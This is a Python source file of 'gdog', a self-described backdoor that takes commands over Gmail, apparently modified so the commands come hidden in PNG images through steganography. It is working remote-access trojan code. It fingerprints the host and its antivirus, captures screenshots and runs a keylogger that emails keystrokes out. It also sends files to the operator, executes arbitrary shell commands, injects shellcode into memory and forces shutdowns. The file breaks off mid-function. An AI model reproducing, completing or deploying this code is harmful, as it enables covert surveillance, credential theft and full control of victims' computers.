# coding=utf-8
"""
    This file is part of gdog
    Copyright (C) 2016 @maldevel
    https://github.com/maldevel/gdog
    
    gdog - A fully featured backdoor that uses Gmail as a C&C server

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    
    For more see the file 'LICENSE' for copying permission.
"""

__author__ = "maldevel"
__copyright__ = "Copyright (c) 2016 @maldevel"
__credits__ = ["maldevel", "carnal0wnage", "byt3bl33d3r", "haydnjohnson"]
__license__ = "GPLv3"
__version__ = "1.2"
__maintainer__ = "maldevel"


#####################
import sys
import time
from png import from_array, Reader
import base64
import os
import struct
import re
import argparse
import subprocess
import os
import base64
import threading
import time
import random
import string
import imaplib
import smtplib
import email
import platform
import hashlib
import ctypes
import json
import wmi
import getpass
import uuid
import netifaces
import urllib2
import urllib
import pythoncom
import random

from win32com.client import GetObject
from enum import Enum
from base64 import b64decode
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
# from email.MIMEMultipart import MIMEMultipart
from email.mime.base import MIMEBase
# from email.MIMEBase import MIMEBase
from email import Encoders
from email.MIMEText import MIMEText
from struct import pack
from zlib import compress, crc32
from ctypes import c_void_p, c_int, create_string_buffer, sizeof, windll, Structure, WINFUNCTYPE, CFUNCTYPE, POINTER
from ctypes.wintypes import BOOL, DOUBLE, DWORD, HBITMAP, HDC, HGDIOBJ, HWND, INT, LPARAM, LONG, RECT, UINT, WORD, MSG
# from Crypto.Cipher import AES
# from Crypto import Random
######################################################


#######################################
gmail_user = 'your email'
gmail_pwd = 'your pwd'
server = "smtp server"
imap_server = 'imap server'
server_port = 25
AESKey = 'my_AES_key'
EMAIL_KNOCK_TIMEOUT = 60  # seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
JITTER = 100
TAG = 'RELEASE'
VERSION = '1.0.0'
#######################################


def read_stdin():
    if sys.version_info >= (3, 0):
        source = sys.stdin.buffer
    else:
        set_binary_mode(sys.stdin)
        source = sys.stdin
    return source.read()


def bit_stream(data):
    # length
    for byte in struct.pack('!H', len(data)):
        for shift in range(0, 8, 2):
            yield (ord(byte) >> shift) & 3
    # data
    for byte in data:
        for shift in range(0, 8, 2):
            yield (ord(byte) >> shift) & 3


def pixel_stream(pixels):
    for y in range(len(pixels)):
        row = pixels[y]
        for x in range(len(row)):
            yield x, y, row[x]


def read_payload(path):
    if path == '-':
        return read_stdin()
    elif os.path.isfile(path):
        return open(path, 'rb').read()
    elif re.match('^[0-9a-f]+$', path, re.IGNORECASE):
        if sys.version_info >= (3, 0):
            return bytes.fromhex(path)
        else:
            return path.decode('hex')
    elif re.match('^[a-z0-9+/=]+$', path, re.IGNORECASE):
        return base64.b64decode(path)


def png_encode(paylaod_path, in_png_path, out_png_path):
    width, height, pixels, meta = Reader(bytes=read_payload(in_png_path)).asRGB8()

    # Each byte (8 bits) is encoded into 4 other bytes, 2 bits at the end of each byte.
    # Payload needs at least 4x bytes of it's size.
    # Image has 3 bytes per pixel (RGB)
    payload = read_payload(paylaod_path)
    if len(payload) * 4 >= width * height * 3:
        sys.stderr.write('Image is too small')
        exit(-1)

    pixels = list(pixels)
    for b, (x, y, c) in zip(bit_stream(payload), pixel_stream(pixels)):
        # print(b, (x, y, c))
        c &= 0b11111100  # zero-out last two bits
        c |= b  # encode new to bits
        pixels[y][x] = c

    from_array(pixels, 'RGB').save(out_png_path)
    print(out_png_path, 'saved')


def png_decode(png_path):
    width, height, pixels, meta = Reader(bytes=read_payload(png_path)).asRGB8()
    pixels = list(pixels)
    payload_len = 0

    # get len of payload
    for i in range(4):
        tmp = pixels[0][i]
        tmp &= 0b00000011
        payload_len = payload_len | (tmp << (i * 2))
    payload_len = payload_len << 8  # high 8 bits
    byte_low = 0
    for i in range(4):
        tmp = pixels[0][i + 4]
        tmp &= 0b00000011
        byte_low = byte_low | (tmp << (i * 2))
    payload_len |= byte_low  # low 8 bits
    print("payload len: ", payload_len)

    # get content of payload
    payload_list = []
    skip_len = 0
    byte_count = 0
    byte_value = 0
    for x, y, c in pixel_stream(pixels):
        skip_len += 1
        if skip_len <= 8:
            continue
        tmp = c
        tmp &= 0b00000011
        byte_value |= (tmp << (byte_count * 2))
        byte_count += 1
        if byte_count == 4:
            byte_count = 0
            payload_list.append(chr(byte_value))
            byte_value = 0
        if (skip_len > 8 + payload_len * 4):
            break
    payload_list=''.join(payload_list)
    # print(''.join(payload_list))
    print payload_list
    return payload_list

# class InfoSecurity:
#
#     def __init__(self):
#         self.bs = 32
#         self.key = hashlib.sha256(AESKey.encode()).digest()
#
#     def Encrypt(self, plainText):
#         raw = self._pad(plainText)
#         iv = Random.new().read(AES.block_size)
#         cipher = AES.new(self.key, AES.MODE_CBC, iv)
#         return base64.b64encode(iv + cipher.encrypt(raw))
#
#     def Decrypt(self, cipherText):
#         enc = base64.b64decode(cipherText)
#         iv = enc[:AES.block_size]
#         cipher = AES.new(self.key, AES.MODE_CBC, iv)
#         return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
#
#     def _pad(self, s):
#         return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
#
#     def _unpad(self, s):
#         return s[:-ord(s[len(s)-1:])]
#
# infoSec = InfoSecurity()


class AccountType(Enum):
    DUPLICATE_ACCOUNT = 256
    NORMAL_ACCOUNT = 512
    INTERDOMAIN_TRUST_ACCOUNT = 2048
    WORKSTATION_TRUST_ACCOUNT = 4096
    SERVER_TRUST_ACCOUNT = 8192
    
class ChassisTypes(Enum):
    Other = 1
    Unknown = 2
    Desktop = 3
    LowProfileDesktop = 4
    PizzaBox = 5
    MiniTower = 6
    Tower = 7
    Portable = 8
    Laptop = 9
    Notebook = 10
    Handheld = 11 
    DockingStation = 12
    AllInOne = 13
    SubNotebook = 14
    SpaceSaving = 15
    LunchBox = 16
    MainSystemChassis = 17
    ExpansionChassis = 18
    SubChassis = 19
    BusExpansionChassis = 20
    PeripheralChassis = 21
    StorageChassis = 22
    RackMountChassis = 23
    SealedCasePC = 24

# 获取地理位置信息
def getGeolocation():
    try:    
        req = urllib2.Request('http://ip-api.com/json/', data=None, headers={
          'User-Agent':'Gdog'
        })
        response = urllib2.urlopen(req)
        if response.code == 200:
            encoding = response.headers.getparam('charset')
            return json.loads(response.read().decode(encoding))
        return False
    except Exception:
        return False

#获取系统信息，包括硬件、操作系统、网络信息等，并计算一个唯一的系统标识符（UniqueID）
class SystemInfo:
    def __init__(self):
        self.Architecture = platform.machine()
        self.WinVer = platform.platform()
        self.CPU = platform.processor()
        self.User = getpass.getuser()
        self.PCName = platform.node()
        self.isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
        if self.isAdmin == 0:
            self.isAdmin = 'no'
        else:
            self.isAdmin = 'yes'
        w = wmi.WMI()
        self.GPU = []
        for i in w.Win32_VideoController():
            self.GPU.append(i.Caption.strip())
        self.Motherboard = ''
        for i in w.Win32_BaseBoard():
            self.Motherboard = '{0} {1} {2}'.format(i.Manufacturer, i.Product, i.SerialNumber).strip()
            break
        self.ChassisType = ''
        for i in w.Win32_SystemEnclosure():
            for j in i.ChassisTypes:
                self.ChassisType = str(ChassisTypes(j)).split('.')[1]
                break
            break
        self.TotalRam = 0.0
        for i in w.Win32_ComputerSystem():
            self.TotalRam = (round(float(i.TotalPhysicalMemory) / 1024 / 1024 / 1024))
            break
        self.Bios = ''
        for i in w.Win32_BIOS():
            self.Bios = '{0} {1} {2}'.format(i.Caption, i.Manufacturer, i.SerialNumber).strip()
            break
        self.PID = os.getpid()
        self.MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        self.IPv4 = ''
        for iface in netifaces.interfaces():
            if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'] == self.MAC:
                # self.IPv4 = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])[0]['addr']
                self.IPv4 = self.MAC
        self.Antivirus = []
        objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('AntiVirusProduct')
        for i in objWMI:
            self.Antivirus.append(i.displayName.strip())
        self.Firewall = []
        objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('FirewallProduct')
        for i in objWMI:
            self.Firewall.append(i.displayName.strip())
        self.Antispyware = []
        objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('AntiSpywareProduct')
        for i in objWMI:
            self.Antispyware.append(i.displayName.strip())
        self.Geolocation = getGeolocation()
    

        self.UniqueID = hashlib.sha256(
                           self.Architecture + 
                           self.WinVer + 
                           self.CPU + 
                           ';'.join(self.GPU) + 
                           self.isAdmin + 
                           self.Motherboard + 
                           self.ChassisType + 
                           '{0}@{1}'.format(self.User, self.PCName) + 
                           str(self.TotalRam) + 
                           self.Bios + 
                           self.MAC
                   ).hexdigest()


sysInfo = SystemInfo()

#对键盘输入的监控
WH_KEYBOARD_LL=13                                                                 
WM_KEYDOWN=0x0100 #键盘按下的消息
CTRL_CODE = 162 #Ctrl键的键码
        

#指定显示器截屏
### Following code was stolen from python-mss https://github.com/BoboTiG/python-mss ###
class BITMAPINFOHEADER(Structure):
    _fields_ = [('biSize', DWORD), ('biWidth', LONG), ('biHeight', LONG),
                ('biPlanes', WORD), ('biBitCount', WORD),
                ('biCompression', DWORD), ('biSizeImage', DWORD),
                ('biXPelsPerMeter', LONG), ('biYPelsPerMeter', LONG),
                ('biClrUsed', DWORD), ('biClrImportant', DWORD)]

class BITMAPINFO(Structure):
    _fields_ = [('bmiHeader', BITMAPINFOHEADER), ('bmiColors', DWORD * 3)]

class screenshot(threading.Thread):
    ''' Mutliple ScreenShots implementation for Microsoft Windows. '''

    def __init__(self, jobid):
        ''' Windows initialisations. '''
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self._set_argtypes()
        self._set_restypes()
        self.start()

    def _set_argtypes(self):
        ''' Functions arguments. '''

        self.MONITORENUMPROC = WINFUNCTYPE(INT, DWORD, DWORD, POINTER(RECT),
                                           DOUBLE)
        windll.user32.GetSystemMetrics.argtypes = [INT]
        windll.user32.EnumDisplayMonitors.argtypes = [HDC, c_void_p,
                                                      self.MONITORENUMPROC,
                                                      LPARAM]
        windll.user32.GetWindowDC.argtypes = [HWND]
        windll.gdi32.CreateCompatibleDC.argtypes = [HDC]
        windll.gdi32.CreateCompatibleBitmap.argtypes = [HDC, INT, INT]
        windll.gdi32.SelectObject.argtypes = [HDC, HGDIOBJ]
        windll.gdi32.BitBlt.argtypes = [HDC, INT, INT, INT, INT, HDC, INT, INT,
                                        DWORD]
        windll.gdi32.DeleteObject.argtypes = [HGDIOBJ]
        windll.gdi32.GetDIBits.argtypes = [HDC, HBITMAP, UINT, UINT, c_void_p,
                                           POINTER(BITMAPINFO), UINT]

    def _set_restypes(self):
        ''' Functions return type. '''

        windll.user32.GetSystemMetrics.restypes = INT
        windll.user32.EnumDisplayMonitors.restypes = BOOL
        windll.user32.GetWindowDC.restypes = HDC
        windll.gdi32.CreateCompatibleDC.restypes = HDC
        windll.gdi32.CreateCompatibleBitmap.restypes = HBITMAP
        windll.gdi32.SelectObject.restypes = HGDIOBJ
        windll.gdi32.BitBlt.restypes = BOOL
        windll.gdi32.GetDIBits.restypes = INT
        windll.gdi32.DeleteObject.restypes = BOOL

    def enum_display_monitors(self, screen=-1):
        ''' Get positions of one or more monitors.
            Returns a dict with minimal requirements.
        '''

        if screen == -1:
            SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN = 76, 77
            SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN = 78, 79
            left = windll.user32.GetSystemMetrics(SM_XVIRTUALSCREEN)
            right = windll.user32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
            top = windll.user32.GetSystemMetrics(SM_YVIRTUALSCREEN)
            bottom = windll.user32.GetSystemMetrics(SM_CYVIRTUALSCREEN)
            yield ({
                b'left': int(left),
                b'top': int(top),
                b'width': int(right - left),
                b'height': int(bottom - top)
            })
        else:

            def _callback(monitor, dc, rect, data):
                ''' Callback for MONITORENUMPROC() function, it will return
                    a RECT with appropriate values.
                '''
                rct = rect.contents
                monitors.append({
                    b'left': int(rct.left),
                    b'top': int(rct.top),
                    b'width': int(rct.right - rct.left),
                    b'height': int(rct.bottom - rct.top)
                })
                return 1

            monitors = []
            callback = self.MONITORENUMPROC(_callback)
            windll.user32.EnumDisplayMonitors(0, 0, callback, 0)
            for mon in monitors:
                yield mon

    def get_pixels(self, monitor):
        ''' Retrieve all pixels from a monitor. Pixels have to be RGB.
            [1] A bottom-up DIB is specified by setting the height to a
            positive number, while a top-down DIB is specified by
            setting the height to a negative number.
            https://msdn.microsoft.com/en-us/library/ms787796.aspx
            https://msdn.microsoft.com/en-us/library/dd144879%28v=vs.85%29.aspx
        '''

        width, height = monitor[b'width'], monitor[b'height']
        left, top = monitor[b'left'], monitor[b'top']
        SRCCOPY = 0xCC0020
        DIB_RGB_COLORS = BI_RGB = 0
        srcdc = memdc = bmp = None

        try:
            bmi = BITMAPINFO()
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
            bmi.bmiHeader.biWidth = width
            bmi.bmiHeader.biHeight = -height  # Why minus? See [1]
            bmi.bmiHeader.biPlanes = 1  # Always 1
            bmi.bmiHeader.biBitCount = 24
            bmi.bmiHeader.biCompression = BI_RGB
            buffer_len = height * width * 3
            self.image = create_string_buffer(buffer_len)
            srcdc = windll.user32.GetWindowDC(0)
            memdc = windll.gdi32.CreateCompatibleDC(srcdc)
            bmp = windll.gdi32.CreateCompatibleBitmap(srcdc, width, height)
            windll.gdi32.SelectObject(memdc, bmp)
            windll.gdi32.BitBlt(memdc, 0, 0, width, height, srcdc, left, top,
                                SRCCOPY)
            bits = windll.gdi32.GetDIBits(memdc, bmp, 0, height, self.image,
                                          bmi, DIB_RGB_COLORS)
            if bits != height:
                raise Exception('MSS: GetDIBits() failed.')
        finally:
            # Clean up
            if srcdc:
                windll.gdi32.DeleteObject(srcdc)
            if memdc:
                windll.gdi32.DeleteObject(memdc)
            if bmp:
                windll.gdi32.DeleteObject(bmp)

        # Replace pixels values: BGR to RGB
        self.image[2:buffer_len:3], self.image[0:buffer_len:3] = \
            self.image[0:buffer_len:3], self.image[2:buffer_len:3]
        return self.image

    def save(self,
             output='screenshot-%d.png',
             screen=-1,
             callback=lambda *x: True):
        ''' Grab a screenshot and save it to a file.
            Parameters:
             - output - string - the output filename. It can contain '%d' which
                                 will be replaced by the monitor number.
             - screen - int - grab one screenshot of all monitors (screen=-1)
                              grab one screenshot by monitor (screen=0)
                              grab the screenshot of the monitor N (screen=N)
             - callback - function - in case where output already exists, call
                                     the defined callback function with output
                                     as parameter. If it returns True, then
                                     continue; else ignores the monitor and
                                     switches to ne next.
            This is a generator which returns created files.
        '''

        # Monitors screen shots!
        for i, monitor in enumerate(self.enum_display_monitors(screen)):
            if screen <= 0 or (screen > 0 and i + 1 == screen):
                fname = output
                if '%d' in output:
                    fname = output.replace('%d', str(i + 1))
                callback(fname)
                self.save_img(data=self.get_pixels(monitor),
                              width=monitor[b'width'],
                              height=monitor[b'height'],
                              output=fname)
                yield fname

    def save_img(self, data, width, height, output):
        ''' Dump data to the image file.
            Pure python PNG implementation.
            Image represented as RGB tuples, no interlacing.
            http://inaps.org/journal/comment-fonctionne-le-png
        '''

        zcrc32 = crc32
        zcompr = compress
        len_sl = width * 3
        scanlines = b''.join(
            [b'0' + data[y * len_sl:y * len_sl + len_sl]
             for y in range(height)])

        magic = pack(b'>8B', 137, 80, 78, 71, 13, 10, 26, 10)

        # Header: size, marker, data, CRC32
        ihdr = [b'', b'IHDR', b'', b'']
        ihdr[2] = pack(b'>2I5B', width, height, 8, 2, 0, 0, 0)
        ihdr[3] = pack(b'>I', zcrc32(b''.join(ihdr[1:3])) & 0xffffffff)
        ihdr[0] = pack(b'>I', len(ihdr[2]))

        # Data: size, marker, data, CRC32
        idat = [b'', b'IDAT', b'', b'']
        idat[2] = zcompr(scanlines, 9)
        idat[3] = pack(b'>I', zcrc32(b''.join(idat[1:3])) & 0xffffffff)
        idat[0] = pack(b'>I', len(idat[2]))

        # Footer: size, marker, None, CRC32
        iend = [b'', b'IEND', b'', b'']
        iend[3] = pack(b'>I', zcrc32(iend[1]) & 0xffffffff)
        iend[0] = pack(b'>I', len(iend[2]))

        with open(os.path.join(os.getenv('TEMP') + output), 'wb') as fileh:
            fileh.write(
                magic + b''.join(ihdr) + b''.join(idat) + b''.join(iend))
            return
        err = 'MSS: error writing data to "{0}".'.format(output)
        raise Exception(err)

    def run(self):
        img_name = genRandomString() + '.png'
        for filename in self.save(output=img_name, screen=-1):
            sendEmail({'cmd': 'screenshot', 'res': 'Screenshot taken'}, jobid=self.jobid, attachment=[os.path.join(os.getenv('TEMP') + img_name)])

### End of python-mss code ###


class MessageParser:

    def __init__(self, msg_data):
        self.attachment = None
        self.getPayloads(msg_data)
        self.getSubjectHeader(msg_data)
        self.getDateHeader(msg_data)

    def getPayloads(self, msg_data):
        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
            # if payload.get_content_maintype() == 'text':
            #     self.text = payload.get_payload()
            #     self.dict = json.loads(infoSec.Decrypt(payload.get_payload()))
            #
            # elif payload.get_content_maintype() == 'application':
            #     self.attachment = payload.get_payload()

            if payload.get_content_maintype() == 'image':
                print "Successfully get image."
                image_data = payload.get_payload(decode=True)
                # 确保对数据进行解码
                # 将图像数据保存为文件
                with open("image.png", "wb") as image_file:
                    image_file.write(image_data)
                print("Image saved successfully.")
                # 提取指令
                self.dict = json.loads(png_decode("image.png"))

                # print dict
                # exit(0)
            elif payload.get_content_maintype() == 'application':
                self.attachment = payload.get_payload()

    def getSubjectHeader(self, msg_data):
        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']

    def getDateHeader(self, msg_data):
        self.date = email.message_from_string(msg_data[1][0][1])['Date']

#键盘记录器
class keylogger(threading.Thread):
    #Stolen from http://earnestwish.com/2015/06/09/python-keyboard-hooking/                                                          
    exit = False

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.hooked  = None
        self.keys = ''
        self.start()

    def installHookProc(self, pointer):                                           
        self.hooked = ctypes.windll.user32.SetWindowsHookExA( 
                        WH_KEYBOARD_LL, 
                        pointer, 
                        windll.kernel32.GetModuleHandleW(None), 
                        0
        )

        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):                                                  
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def getFPTR(self, fn):                                                                  
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        return CMPFUNC(fn)

    def hookProc(self, nCode, wParam, lParam):                                              
        if wParam is not WM_KEYDOWN:
            return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)

        self.keys += chr(lParam[0])

        if len(self.keys) > 100:
            sendEmail({'cmd': 'keylogger', 'res': r'{}'.format(self.keys)}, self.jobid)
            self.keys = ''

        if (CTRL_CODE == int(lParam[0])) or (self.exit == True):
            sendEmail({'cmd': 'keylogger', 'res': 'Keylogger stopped'}, self.jobid)
            self.uninstallHookProc()

        return ctypes.windll.user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)     

    def startKeyLog(self):                                                                
        msg = MSG()
        ctypes.windll.user32.GetMessageA(ctypes.byref(msg),0,0,0)

    def run(self):                                 
        pointer = self.getFPTR(self.hookProc)

        if self.installHookProc(pointer):
            sendEmail({'cmd': 'keylogger', 'res': 'Keylogger started'}, self.jobid)
            self.startKeyLog()

#从客户端下载文件
class download(threading.Thread):

    def __init__(self, jobid, filepath):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.filepath = filepath

        self.daemon = True
        self.start()

    def run(self):
        try:
            if os.path.exists(self.filepath) is True:
                sendEmail({'cmd': 'download', 'res': 'Success'}, self.jobid, [self.filepath])
            else:
                sendEmail({'cmd': 'download', 'res': 'Path to file invalid'}, self.jobid)
        except Exception as e:
            sendEmail({'cmd': 'download', 'res': 'Failed: {}'.format(e)}, self.jobid)

#从WEB下载文件
class downloadfromurl(threading.Thread):

    def __init__(self, jobid, url):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.url = url
        self.daemon = True
        self.start()

    def run(self):
        try:
            urllib.urlretrieve(self.url, os.path.join(os.getenv('TEMP') + '\\'  + self.url.split('/')[-1]))
            sendEmail({'cmd': 'downloadfromurl', 'res': 'Success'}, self.jobid, [self.url])
        except Exception as e:
            sendEmail({'cmd': 'downloadfromurl', 'res': 'Failed: {}'.format(e)}, self.jobid)
            
# 获取运行中进程信息
class tasks(threading.Thread):

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.start()

    def _detectRunningProcesses(self):
        pythoncom.CoInitialize()
        procs = []
        w = wmi.WMI ()
        for process in w.Win32_Process ():
            procs.append('{0};{1}'.format(process.ProcessId, process.Name))
        return procs
    
    def run(self):
        try:
            sendEmail({'cmd': 'tasks', 'res': self._detectRunningProcesses()}, self.jobid)
        except Exception as e:
            sendEmail({'cmd': 'tasks', 'res': 'Failed: {}'.format(e)}, self.jobid)
            
# 获取当前系统中的所有Windows服务信息
class services(threading.Thread):

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.start()

    def _detectServices(self):
        pythoncom.CoInitialize()
        srvs = []
        w = wmi.WMI ()
        for service in w.Win32_Service ():
            srvs.append('{0};{1}'.format(service.Name, str(service.StartMode)))
        return srvs
    
    def run(self):
        try:
            sendEmail({'cmd': 'services', 'res': self._detectServices()}, self.jobid)
        except Exception as e:
            sendEmail({'cmd': 'services', 'res': 'Failed: {}'.format(e)}, self.jobid)
            
# 获取当前系统中的所有Windows用户的信息
class users(threading.Thread):

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.start()

    def _detectUsers(self):
        pythoncom.CoInitialize()
        usr = []
        w = wmi.WMI ()
        for user in w.Win32_UserAccount ():
            usr.append('{0};{1};{2}'.format(user.Name, str(AccountType(user.AccountType)).split('.')[1], 'Disabled' if user.Disabled else 'Enabled'))
        return usr
    
    def run(self):
        try:
            sendEmail({'cmd': 'users', 'res': self._detectUsers()}, self.jobid)
        except Exception as e:
            sendEmail({'cmd': 'users', 'res': 'Failed: {}'.format(e)}, self.jobid)
            
# 获取设备信息（硬件）
class devices(threading.Thread):

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.start()

    def _detectDevices(self):
        pythoncom.CoInitialize()
        devs = []
        w = wmi.WMI ()
        for dev in w.Win32_PnPEntity ():
            devs.append('{0};{1}'.format(dev.Name, dev.Manufacturer))
        return devs
    
    def run(self):
        try:
            sendEmail({'cmd': 'devices', 'res': self._detectDevices()}, self.jobid)
        except Exception as e:
            sendEmail({'cmd': 'devices', 'res': 'Failed: {}'.format(e)}, self.jobid)
        
# 上传文件至客户端
class upload(threading.Thread):

    def __init__(self, jobid, dest, attachment):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.dest = dest
        self.attachment = attachment
        self.daemon = True
        self.start()

    def run(self):
        try:
            with open(self.dest, 'wb') as fileh:
                fileh.write(b64decode(self.attachment))
            sendEmail({'cmd': 'upload', 'res': 'Success'}, self.jobid)
        except Exception as e:
            sendEmail({'cmd': 'upload', 'res': 'Failed: {}'.format(e)}, self.jobid)

# 锁定客户端屏幕
class lockScreen(threading.Thread):

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.start()

    def run(self):
        try:
            ctypes.windll.user32.LockWorkStation()
            sendEmail({'cmd': 'lockscreen', 'res': 'Success'}, jobid=self.jobid)
        except Exception as e:
            #if verbose == True: print print_exc()
            pass
        
#关闭计算机
class shutdown(threading.Thread):

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.start()

    def run(self):
        try:
            sendEmail({'cmd': 'shutdown', 'res': 'Success'}, jobid=self.jobid)
            time.sleep(3)
            subprocess.call(["shutdown", "/f", "/s", "/t", "0"])
        except Exception as e:
            #if verbose == True: print print_exc()
            pass

# 重启计算机
class restart(threading.Thread):

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.start()

    def run(self):
        try:
            sendEmail({'cmd': 'restart', 'res': 'Success'}, jobid=self.jobid)
            time.sleep(3)
            subprocess.call(["shutdown", "/f", "/r", "/t", "0"])            
        except Exception as e:
            #if verbose == True: print print_exc()
            pass
# 修改Jitter时间
class jitter(threading.Thread ):

    def __init__(self, command, jobid):
        threading.Thread.__init__(self)
        self.command = command
        self.jobid = jobid
        self.daemon = True
        self.start()

    def run(self):
        try:
            global JITTER
            JITTER = self.command
            sendEmail({'cmd': 'jitter', 'res': 'Success with Changing Jitter too %s Seconds' %str(JITTER)}, jobid=self.jobid)

        except Exception as e:
            #if verbose == True: print print_exc()
            pass
#可能是有关邮件超时时间的设置？
class email_check(threading.Thread ):

    def __init__(self, command, jobid):
        threading.Thread.__init__(self)
        self.command = command
        self.jobid = jobid
        self.daemon = True
        self.start()

    def run(self):
        try:
            global EMAIL_KNOCK_TIMEOUT
            EMAIL_KNOCK_TIMEOUT = self.command
            sendEmail({'cmd': 'email_check', 'res': 'Success with changing Email Check in time too %s Seconds' %str(EMAIL_KNOCK_TIMEOUT)}, jobid=self.jobid)
            time.sleep(3)

        except Exception as e:
            #if verbose == True: print print_exc()
            pass
        
# 注销当前用户
class logoff(threading.Thread):

    def __init__(self, jobid):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.daemon = True
        self.start()

    def run(self):
        try:
            sendEmail({'cmd': 'logoff', 'res': 'Success'}, jobid=self.jobid)
            time.sleep(3)
            subprocess.call(["shutdown", "/f", "/l"])            
        except Exception as e:
            #if verbose == True: print print_exc()
            pass
# 执行shellcode
class execShellcode(threading.Thread):

    def __init__(self, shellc, jobid):
        threading.Thread.__init__(self)
        self.shellc = shellc
        self.jobid = jobid

        self.daemon = True
        self.start()

    def run(self):
        try:
            shellcode = self.shellc.decode("string_escape")
            shellcode = bytearray(shellcode)

            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
                                                      ctypes.c_int(len(shellcode)), 
                                                      ctypes.c_int(0x3000), 
                                                      ctypes.c_int(0x40))
        
            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        
            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) 
            
            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                     ctypes.c_int(0),
                                                     ctypes.c_int(ptr),
                                                     ctypes.c_int(0),
                                                     ctypes.c_int(0),
                                                     ctypes.pointer(ctypes.c_int(0)))
            
            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

        except Exception as e:
            #if verbose == True: print_exc()
            pass

# 访问网站
class visitwebsite(threading.Thread):

    def __init__(self, url, jobid):
        threading.Thread.__init__(self)
        self.url = url
        self.jobid = jobid
        self.daemon = True
        self.start()

    def run(self):
        try:
            urllib2.urlopen(self.url).read()
            sendEmail({'cmd': 'visitwebsite', 'res': 'Success'}, jobid=self.jobid)
        except Exception as e:
            #if verbose == True: print_exc()
            pass
        
# 执行系统命令
class execCmd(threading.Thread):

    def __init__(self, command, jobid):
        threading.Thread.__init__(self)
        self.command = command
        self.jobid = jobid

        self.daemon = True
        self.start()

    def run(self):
        try:
            proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read()
            stdout_value += proc.stderr.read()

            sendEmail({'cmd': self.command, 'res': stdout_value}, jobid=self.jobid)
        except Exception as e:
            #if verbose == True: print_exc()
            pass

# 给用户弹消息框
class message(threading.Thread):

    def __init__(self, TextAndTitle, jobid):
        threading.Thread.__init__(self)
        self.TextAndTitle = TextAndTitle
        self.jobid = jobid

        self.daemon = True
        self.start()

    def run(self):
        try:
            ctypes.windll.user32.MessageBoxW(0, self.TextAndTitle[0], self.TextAndTitle[1], 0)
            sendEmail({'cmd': 'message', 'res': 'Success'}, jobid=self.jobid)
        except Exception as e:
            #if verbose == True: print_exc()
            pass


def genRandomString(slen=10):
    return ''.join(random.sample(string.ascii_letters + string.digits, slen))

# 获取当前所有可见窗口的标题，并以列表的形式返回
def detectForgroundWindows():
    #Stolen fom https://sjohannes.wordpress.com/2012/03/23/win32-python-getting-all-window-titles/
    EnumWindows = ctypes.windll.user32.EnumWindows
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
    GetWindowText = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible = ctypes.windll.user32.IsWindowVisible

    titles = []
    def foreach_window(hwnd, lParam):
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buff, length + 1)
            titles.append(buff.value)
        return True

